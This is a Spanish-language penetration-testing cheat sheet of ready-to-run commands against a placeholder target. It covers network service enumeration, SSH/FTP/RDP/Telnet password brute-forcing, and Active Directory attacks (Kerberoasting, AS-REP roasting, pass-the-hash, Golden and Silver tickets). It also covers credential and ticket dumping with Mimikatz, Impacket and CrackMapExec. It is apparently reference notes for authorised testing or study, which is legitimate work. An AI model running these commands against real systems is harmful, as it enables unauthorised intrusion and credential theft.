# Enumeration

Propietario: Adrian Gisbert Cabello

### HTTP

```bash
# Enumerar directorios y archivos con Gobuster
gobuster dir -u http://1.1.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Enumerar directorios y archivos con Dirb
dirb http://1.1.1.1 /usr/share/wordlists/dirb/common.txt

# Escanear vulnerabilidades con Nikto
nikto -h http://1.1.1.1

# Extraer banners con Nmap
nmap -p 80 --script http-headers 1.1.1.1

# Enumerar aplicaciones web con WhatWeb
whatweb http://1.1.1.1

# Escanear con Wapiti
wapiti http://1.1.1.1

# Escanear con Arachni
arachni http://1.1.1.1

# Enumerar con Burp Suite (repetidor, escáner, etc.)
# (Lanzar Burp Suite y configurar el proxy en el navegador)

# Enumerar aplicaciones con Wappalyzer
# (Instalar la extensión Wappalyzer en el navegador)
```

### SSH

```bash
# Enumerar versiones de software con Nmap
nmap -sV -p 22 1.1.1.1

# Fuerza bruta de credenciales con Hydra
hydra -l usuario -P /usr/share/wordlists/rockyou.txt ssh://1.1.1.1

# Fuerza bruta de credenciales con Medusa
medusa -h 1.1.1.1 -u usuario -P /usr/share/wordlists/rockyou.txt -M ssh

# Fuerza bruta de credenciales con Patator
patator ssh_login host=1.1.1.1 user=usuario password=FILE0 0=/usr/share/wordlists/rockyou.txt

# Enumerar con ssh-audit
ssh-audit 1.1.1.1
```

### SMB

```bash
# Enumerar recursos compartidos con smbclient
smbclient -L \\1.1.1.1 -N

# Enumerar usuarios y recursos con enum4linux
enum4linux -a 1.1.1.1

# Enumerar con Nmap
nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 1.1.1.1

# Enumerar con CrackMapExec
crackmapexec smb 1.1.1.1

# Enumerar con SMBMap
smbmap -H 1.1.1.1

# Enumerar con rpcclient
rpcclient -U "" 1.1.1.1

# Enumerar con Metasploit
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 1.1.1.1
run
```

### FTP

```bash
# Enumerar versiones de software con Nmap
nmap -sV -p 21 1.1.1.1

# Fuerza bruta de credenciales con Hydra
hydra -l usuario -P /usr/share/wordlists/rockyou.txt ftp://1.1.1.1

# Fuerza bruta de credenciales con Medusa
medusa -h 1.1.1.1 -u usuario -P /usr/share/wordlists/rockyou.txt -M ftp

# Enumerar con Nmap (scripts)
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 1.1.1.1

# Conexión anónima con FTP
ftp 1.1.1.1
```

### SMTP

```bash
# Enumerar usuarios con Nmap
nmap -p 25 --script smtp-enum-users 1.1.1.1

# Enumerar con smtp-user-enum
smtp-user-enum -M VRFY -U usuarios.txt -t 1.1.1.1

# Enumerar con Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 1.1.1.1
set USER_FILE /path/to/usuarios.txt
run

# Enumerar con swaks
swaks --to usuario@1.1.1.1 --from test@test.com --server 1.1.1.1
```

### RDP

```bash
# Enumerar con Nmap
nmap -sV -p 3389 1.1.1.1

# Fuerza bruta de credenciales con Hydra
hydra -t 1 -V -f -l usuario -P /usr/share/wordlists/rockyou.txt rdp://1.1.1.1

# Enumerar con rdesktop
rdesktop -u "" -p "" 1.1.1.1

# Enumerar con xfreerdp
xfreerdp /v:1.1.1.1 /u:usuario /p:password
```

### SNMP

```bash
# Enumerar con Nmap
nmap -sU -p 161 --script=snmp-info 1.1.1.1

# Enumerar con snmpwalk
snmpwalk -v 2c -c public 1.1.1.1

# Enumerar con onesixtyone
onesixtyone -c public -i 1.1.1.1

# Enumerar con snmp-check
snmp-check 1.1.1.1 -c public
```

### Telnet

```bash
# Enumerar versiones de software con Nmap
nmap -sV -p 23 1.1.1.1

# Fuerza bruta de credenciales con Hydra
hydra -l usuario -P /usr/share/wordlists/rockyou.txt telnet://1.1.1.1

# Fuerza bruta de credenciales con Medusa
medusa -h 1.1.1.1 -u usuario -P /usr/share/wordlists/rockyou.txt -M telnet

# Conexión con Telnet
telnet 1.1.1.1
```

## Active Directory

### Enumeración Inicial

**CrackMapExec**

```bash
# Enumerar información básica
crackmapexec smb 1.1.1.1

# Enumerar usuarios con credenciales conocidas
crackmapexec smb 1.1.1.1 -u usuario -p password --users

# Enumerar recursos compartidos
crackmapexec smb 1.1.1.1 -u usuario -p password --shares

# Enumerar políticas de dominio
crackmapexec smb 1.1.1.1 -u usuario -p password --policies
```

**Impacket (GetUserSPNs)**

```bash
# Enumerar SPNs (Service Principal Names)
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py dominio/usuario:password@1.1.1.1
```

**Enum4linux**

```bash
# Enumerar información general de AD
enum4linux -a 1.1.1.1

# Enumerar usuarios
enum4linux -U 1.1.1.1

# Enumerar recursos compartidos
enum4linux -S 1.1.1.1
```

**LDAP Enumeration (ldapsearch)**

```bash
# Enumerar objetos LDAP
ldapsearch -x -h 1.1.1.1 -D "cn=usuario,dc=dominio,dc=com" -w 'password' -b "dc=dominio,dc=com"

# Buscar usuarios en AD
ldapsearch -x -h 1.1.1.1 -D "cn=usuario,dc=dominio,dc=com" -w 'password' -b "dc=dominio,dc=com" "(objectClass=user)"
```

### Enumeración Detallada

**BloodHound**

1. **Instalación de BloodHound y Neo4j**
    
    ```bash
    sudo apt install bloodhound neo4j
    sudo neo4j console
    bloodhound
    ```
    
2. **Ejecutar SharpHound en el objetivo**
    - Descargar [SharpHound](https://github.com/BloodHoundAD/BloodHound)
    - Ejecutar `SharpHound.exe` o `SharpHound.ps1` en la máquina objetivo:
        
        ```powershell
        .\SharpHound.exe -c All
        ```
        
    - Subir los archivos de salida a BloodHound para análisis.

**PowerView (PowerSploit)**

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Enumerar dominios
Get-NetDomain

# Enumerar controladores de dominio
Get-NetDomainController

# Enumerar usuarios
Get-NetUser

# Enumerar grupos
Get-NetGroup

# Enumerar miembros de grupos específicos
Get-NetGroupMember -GroupName "Administrators"

# Enumerar equipos
Get-NetComputer

# Enumerar ACLs en un objeto específico
Get-ObjectAcl -SamAccountName usuario -ResolveGUIDs
```

### Kerberoasting

**Impacket (GetUserSPNs)**

```bash
# Enumerar y solicitar TGS (Ticket Granting Service) para cuentas de servicio
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 1.1.1.1 dominio/usuario:password
```

**Rubeus**

```powershell
# Ejecutar Rubeus para realizar Kerberoasting
Rubeus.exe kerberoast
```

### AS-REP Roasting

**Impacket (GetNPUsers)**

```bash
# Enumerar cuentas que no requieren preautenticación Kerberos
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py dominio/ -no-pass -usersfile usuarios.txt -dc-ip 1.1.1.1
```

**Rubeus**

```powershell
# Ejecutar Rubeus para realizar AS-REP Roasting
Rubeus.exe asreproast
```

### Enumeración de Políticas y Delegación

**Gpresult**

```bash
# Obtener políticas de grupo aplicadas a un usuario
gpresult /R /USER dominio\usuario /S 1.1.1.1 /U dominio\administrador /P password
```

**Gpupdate**

```bash
# Forzar la actualización de políticas de grupo
gpupdate /force
```

**Adfind**

```bash
# Enumerar delegaciones Kerberos
adfind -h 1.1.1.1 -b "dc=dominio,dc=com" -f "msDS-AllowedToDelegateTo=*"
```

### Explotación de Active Directory

### Pass-the-Hash

**Impacket (wmiexec, smbexec, atexec)**

```bash
# Pass-the-Hash usando wmiexec
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py dominio/usuario@1.1.1.1 -hashes lmhash:nthash

# Pass-the-Hash usando smbexec
python3 /usr/share/doc/python3-impacket/examples/smbexec.py dominio/usuario@1.1.1.1 -hashes lmhash:nthash

# Pass-the-Hash usando atexec
python3 /usr/share/doc/python3-impacket/examples/atexec.py dominio/usuario@1.1.1.1 -hashes lmhash:nthash
```

**CrackMapExec**

```bash
# Pass-the-Hash con CrackMapExec
crackmapexec smb 1.1.1.1 -u usuario -H nthash
```

### Pass-the-Ticket

**Mimikatz**

```powershell
# Exportar ticket Kerberos
sekurlsa::tickets /export

# Usar ticket Kerberos
kerberos::ptt ticket.kirbi

# Listar tickets Kerberos
kerberos::list
```

**Rubeus**

```powershell
# Importar ticket Kerberos
Rubeus.exe ptt /ticket:base64_ticket
```

### Golden Ticket

**Mimikatz**

```powershell
# Crear un Golden Ticket
kerberos::golden /user:usuario /domain:dominio.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash /id:500

# Inyectar el Golden Ticket
kerberos::ptt ticket.kirbi
```

### Silver Ticket

**Mimikatz**

```powershell
# Crear un Silver Ticket
kerberos::golden /user:usuario /domain:dominio.com /sid:S-1-5-21-... /target:servidor /service:cifs /rc4:hash /id:500

# Inyectar el Silver Ticket
kerberos::ptt ticket.kirbi
```

### Post-Exploitation

### Dump de Hashes

**Impacket (secretsdump)**

```bash
# Dump de hashes de NTLM
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py dominio/usuario:password@1.1.1.1

# Dump de hashes de NTLM usando Pass-the-Hash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py dominio/usuario@1.1.1.1 -hashes lmhash:nthash
```

**Mimikatz**

```powershell
# Dump de hashes con Mimikatz
privilege::debug
lsadump::lsa /patch
```

**CrackMapExec**

```bash
# Dump de hashes con CrackMapExec
crackmapexec smb 1.1.1.1 -u usuario -p password --ntds
```

### Dump de Tickets Kerberos

**Mimikatz**

```powershell
# Dump de tickets Kerberos
sekurlsa::tickets /export
```

**Rubeus**

```powershell
# Dump de tickets Kerberos
Rubeus.exe dump
```

### Herramientas Adicionales

- **ADRecon**: Una herramienta para recopilar información de AD en formato HTML o Excel.
- **PingCastle**: Herramienta de auditoría y evaluación de seguridad para AD.
- **SharpHound**: Recopilador de datos para BloodHound.
- **PowerView**: Parte de PowerSploit para la enumeración de AD.
- **PowerShell Empire**: Framework de post-explotación con módulos para AD.